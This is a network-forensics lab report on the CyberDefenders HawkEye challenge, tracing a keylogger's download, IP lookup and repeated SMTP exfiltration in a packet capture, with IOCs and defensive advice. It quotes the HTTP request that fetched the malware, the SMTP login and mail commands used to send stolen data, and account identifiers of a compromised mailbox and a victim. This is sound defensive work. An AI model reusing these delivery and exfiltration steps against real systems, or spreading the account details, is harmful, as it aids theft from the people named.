# CyberDefenders HawkEye Investigation Report

## 1. Executive Summary

During this network forensics lab, I investigated a keylogger data-exfiltration incident using the CyberDefenders "HawkEye" challenge dataset (`stealer.pcap`). The capture contains **4,003 packets** recorded over **1 hour, 3 minutes, and 41 seconds**.

By reconstructing application-layer network streams in Wireshark, I identified the compromised internal workstation, carved the initial malware binary from an HTTP download stream, traced an automated external IP lookup, and documented seven successive data-exfiltration cycles over authenticated SMTP.

All 24 lab challenge questions were systematically solved and verified directly against packet evidence.

---

## 2. Evidence Inventory & Cryptographic Hashes

To establish an unbroken forensic chain of custody, MD5 and SHA-256 cryptographic hashes were computed for the primary capture file and the carved malware executable.

| Evidence Item | Filename / Artifact | File Size | MD5 Checksum | SHA-256 Checksum |
| :--- | :--- | :--- | :--- | :--- |
| **Network PCAP** | `stealer.pcap` | 2,454,198 bytes | `6DBD3019A87981CC77DD14C32D7AC3A4` | `22106927C11836D29078DFBEC20BE9D6B61B1F3F47F95C758ACC47A1FB424E51` |
| **Carved Binary** | `tkraw_Protected99.exe` | 2,025,472 bytes | `71826BA081E303866CE2A2534491A2F7` | `62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11` |

---

## 3. Investigation Methodology

The investigation was conducted using offline packet analysis tools:

* **Wireshark:** Used to filter traffic by protocol (`dns`, `http`, `smtp`, `tcp`), follow TCP streams, inspect packet headers, and export binary objects from HTTP streams.
* **PowerShell (`Get-FileHash`):** Used to compute and verify cryptographic hashes of disk artifacts.
* **Python Standard Library:** Used to programmatically parse packet timestamps, verify interval calculations, and validate PNG headers.

### Analytical Workflow
1. Inspected global capture properties to determine capture volume and total duration.
2. Filtered link- and network-layer traffic to identify the victim endpoint and local network topology.
3. Examined DNS queries and HTTP connections to trace staging infrastructure and payload delivery.
4. Carved the executable payload from HTTP stream reassembly.
5. Analyzed outbound reconnaissance requests to third-party public IP lookup services.
6. Decoded base64-encoded SMTP authentication exchanges and email payload contents.
7. Calculated the exact interval timing between repeated exfiltration cycles across the entire 63-minute capture.

---

## 4. Victim Host Identification

Link-layer, network-layer, and application-layer telemetry revealed the identity and configuration of the affected system:

| Parameter | Observed Value | Evidentiary Source |
| :--- | :--- | :--- |
| **Computer Name** | `Beijing-5cd1-PC` | NetBIOS / SMB Name Announcements |
| **Internal IPv4 Address** | `10.4.10.132` | Source IP in TCP stream establishment |
| **MAC Address** | `00:08:02:1c:47:ae` | Ethernet frame source address |
| **NIC Manufacturer** | Hewlett-Packard Company | OUI lookup `00:08:02` (Palo Alto, CA) |
| **Operating System** | Windows NT 6.1 (Windows 7 / Server 2008 R2) | HTTP User-Agent string |
| **Local DNS Server** | `10.4.10.4` | Destination of internal UDP/53 queries |
| **Observed Endpoints** | `10.4.10.132`, `10.4.10.10`, `10.4.10.11` | ARP and NetBIOS traffic |

---

## 5. Malware Delivery & Executable Carving

Approximately 47 seconds into the capture, the victim workstation downloaded the malicious executable over cleartext HTTP.

### 5.1 DNS Resolution & TCP Handshake
In **Frame 204**, `10.4.10.132` queried the internal DNS server for `proforma-invoices.com`. In **Frame 206**, the server returned an A record pointing to **`217.182.138.150`** (hosted by OVH SAS in France).

![Figure 1: DNS Resolution for proforma-invoices.com (Frames 204 & 206)](screenshots/04_dns_resolution.png)

In **Frames 207–209**, the workstation established a three-way TCP handshake (`SYN`, `SYN-ACK`, `ACK`) with `217.182.138.150:80`.

![Figure 2: TCP Handshake with External HTTP Server 217.182.138.150 (Frames 207-209)](screenshots/06_external_http_connection.png)

### 5.2 Payload Request & Reassembly
In **Frame 210**, the client issued an HTTP request:
```http
GET /proforma/tkraw_Protected99.exe HTTP/1.1
Host: proforma-invoices.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
```

In **Frame 212**, the web server returned `HTTP/1.1 200 OK` (identifying the server software as **LiteSpeed**). The 2,025,472-byte Windows Portable Executable (PE) was transferred across reassembled TCP segments spanning **Frames 213–3155**.

![Figure 3: HTTP GET Request and 200 OK Response for tkraw_Protected99.exe (Frames 210 & 212)](screenshots/01_http_executable_download.png)

### 5.3 Malware Identification
The carved executable was confirmed with cryptographic hash `62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11`. Embedded email headers generated in subsequent exfiltration traffic conclusively identify the malware variant as:

**HawkEye Keylogger - Reborn v9**

---

## 6. Post-Infection Reconnaissance & SMTP Exfiltration

Within 20 seconds of completing the binary download, the infected host began automated reconnaissance and outbound communications.

### 6.1 External IP Discovery
In **Frame 3159**, the host queried DNS for `bot.whatismyipaddress.com`, which resolved to **`66.171.248.178`** in **Frame 3160**.

In **Frame 3164**, the client sent an HTTP `GET /` request to `66.171.248.178:80`. In **Frame 3167**, the server responded with `HTTP/1.1 200 OK` containing a 14-byte body: **`173.66.146.112`**.

> [!IMPORTANT]
> **Forensic IP Distinction:**
> - **`66.171.248.178`** is the IP address of the third-party lookup service (`bot.whatismyipaddress.com`).
> - **`173.66.146.112`** is the victim's external public IP address, which the malware uses in its exfiltration email body and receives back in the remote SMTP greeting.

![Figure 4: Post-Download External IP Lookup to bot.whatismyipaddress.com (Frames 3159-3167)](screenshots/05_post_download_ip_lookup.png)

### 6.2 SMTP Mail Server Connection
In **Frames 3168–3170**, `10.4.10.132` opened a TCP connection to mail server **`23.229.162.69`** on port **`587`** (submission port, hosted under GoDaddy / Secureserver.net). In **Frame 3173**, the mail server transmitted its service banner:

```text
220-p3plcpnl0413.prod.phx3.secureserver.net ESMTP Exim 4.91 #1 Wed, 10 Apr 2019 13:38:15 -0700
220-We do not authorize the use of this system to transport unsolicited,
220 and/or bulk e-mail.
```

In **Frame 3174**, the client sent `EHLO Beijing-5cd1-PC`, to which the server responded with `250 Hello Beijing-5cd1-PC [173.66.146.112]`, confirming the victim's public IP address.

![Figure 5: Outbound TCP Connection to SMTP Mail Server 23.229.162.69:587 (Frames 3168-3173)](screenshots/07_smtp_server_connection.png)

### 6.3 Authentication & Credential Abuse
In **Frame 3180**, the malware initiated `AUTH LOGIN`. The exchange contained Base64-encoded credentials:
* **Username (Frame 3180):** `c2FsZXMuZGVsQG1hY3dpbmxvZ2lzdGljcy5pbg==` $\rightarrow$ **`sales.del@macwinlogistics.in`**
* **Password (Frame 3182):** Base64-encoded authentication secret $\rightarrow$ **`[REDACTED_LAB_PASSWORD: Decoded SMTP authentication secret redacted for public portfolio presentation; decoded value preserved in original submission report]`**

In **Frame 3184**, the server confirmed authentication: `235 Authentication succeeded`.

![Figure 6: SMTP Authentication Exchange and Credentials (Frames 3178-3184)](screenshots/08_smtp_authentication.png)

### 6.4 Exfiltration Email Delivery
The malware issued `MAIL FROM:<sales.del@macwinlogistics.in>` (**Frame 3185**) and `RCPT TO:<sales.del@macwinlogistics.in>` (**Frame 3188**), followed by `DATA` (**Frame 3191**).

![Figure 7: SMTP Envelope and DATA Submission (Frames 3185-3191)](screenshots/09_email_submission.png)

In **Frame 3194**, the keylogger transmitted the exfiltration message:
* **Subject:** `HawkEye Keylogger - Reborn v9 - [Beijing-5cd1-PC/10.4.10.132]`
* **Body:** Comprehensive system information, operating system architecture, public IP `173.66.146.112`, captured keystrokes, and harvested web credentials, including Bank of America login credentials (`oman.mcguire:[REDACTED_LAB_PASSWORD: Lab credential redacted for public presentation]`).

![Figure 8: Exfiltrated Stolen Telemetry and Credential Payload (Frame 3194)](screenshots/02_smtp_exfiltration.png)

In **Frame 3206**, the server acknowledged acceptance: `250 OK id=1hELVf-00049S-1n Message accepted for delivery`.

![Figure 9: SMTP 250 OK Message Accepted for Delivery (Frame 3206)](screenshots/10_smtp_message_accepted.png)

---

## 7. Recurring Exfiltration Cadence (7 Cycles)

A key finding of this investigation is the identification of seven distinct exfiltration cycles spaced across the 63-minute capture. Each cycle follows the identical three-step pattern: a DNS query for `bot.whatismyipaddress.com`, an HTTP external IP lookup, and an authenticated SMTP transmission on port 587.

| Cycle | Capture Elapsed Time | Packet Frame Range | Protocol Sequence | Cycle Interval |
| :---: | :---: | :---: | :--- | :---: |
| **1** | ~68.5 s | Frames 3159–3208 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | Baseline |
| **2** | ~672.9 s | Frames 3290–3339 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | 604.4 s (~10 min) |
| **3** | ~1277.2 s | Frames 3377–3426 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | 604.3 s (~10 min) |
| **4** | ~1883.0 s | Frames 3462–3511 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | 605.8 s (~10 min) |
| **5** | ~2487.1 s | Frames 3577–3626 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | 604.1 s (~10 min) |
| **6** | ~3091.3 s | Frames 3832–3881 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | 604.2 s (~10 min) |
| **7** | ~3695.4 s | Frames 3910–3959 | DNS $\rightarrow$ HTTP $\rightarrow$ SMTP | 604.1 s (~10 min) |

The measured interval between cycles is consistently **604–606 seconds**, demonstrating an automated **10-minute timer**.

![Figure 10: Repeated SMTP Exfiltration Activity (Frames 3159-4003)](screenshots/03_repeated_smtp_activity.png)

---

## 8. Indicators of Compromise (IOCs)

| Type | Indicator | Description / Context |
| :--- | :--- | :--- |
| **Internal Host** | `10.4.10.132` | Compromised victim machine (`Beijing-5cd1-PC`) |
| **Internal DNS** | `10.4.10.4` | Local resolver handling internal queries |
| **External Staging IP** | `217.182.138.150` | HTTP web server hosting executable payload |
| **Staging Domain** | `proforma-invoices.com` | Domain delivering `tkraw_Protected99.exe` |
| **Reconnaissance IP** | `66.171.248.178` | Public IP lookup service (`bot.whatismyipaddress.com`) |
| **Recon Domain** | `bot.whatismyipaddress.com` | External service queried to discover victim public IP |
| **Victim Public IP** | `173.66.146.112` | Public IP assigned to victim network |
| **Exfiltration Server** | `23.229.162.69:587` | Destination mail relay receiving stolen data |
| **Mail Domain** | `macwinlogistics.in` | Queried apex domain for mail relay (notes cite `mail.winlogistics.in`) |
| **Sender Account** | `sales.del@macwinlogistics.in` | Compromised account used for SMTP authentication |
| **Executable Name** | `tkraw_Protected99.exe` | HawkEye Keylogger binary (2,025,472 bytes) |
| **File MD5** | `71826BA081E303866CE2A2534491A2F7` | Executable MD5 checksum |
| **File SHA-256** | `62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11` | Executable SHA-256 checksum |
| **Malware Variant** | HawkEye Keylogger - Reborn v9 | Threat identification confirmed in email subject headers |

---

## 9. Forensic Limitations & Defensive Recommendations

* **Network Scope Limitation:** Evidence is derived strictly from packet capture data (`stealer.pcap`). Endpoint-level artifacts (such as process execution arguments, registry persistence keys, and initial phishing vector) were not available in the PCAP.
* **Base64 Encoding:** Authentication credentials and message bodies were transmitted in cleartext using reversible Base64 encoding (RFC 4648) rather than encrypted transport (STARTTLS).
* **Defensive Controls:**
  - Block direct outbound egress to port 25, 465, and 587 from user workstations. All mail submission should route through inspected corporate relays.
  - Implement DNS monitoring on lookup services (`bot.whatismyipaddress.com`, `api.ipify.org`) to flag automated reconnaissance from non-server endpoints.
  - Deploy network signatures to detect suspicious executable downloads and unencrypted SMTP authentication.

---

## 10. Conclusion

By systematically reconstructing the 4,003 packets in `stealer.pcap`, this investigation mapped the complete HawkEye keylogger intrusion lifecycle: from initial HTTP download and host discovery, to credential harvesting and periodic SMTP data exfiltration. Every finding was correlated directly with packet timestamps, frame ranges, and cryptographic checksums, providing an evidence-backed reconstruction of the threat.
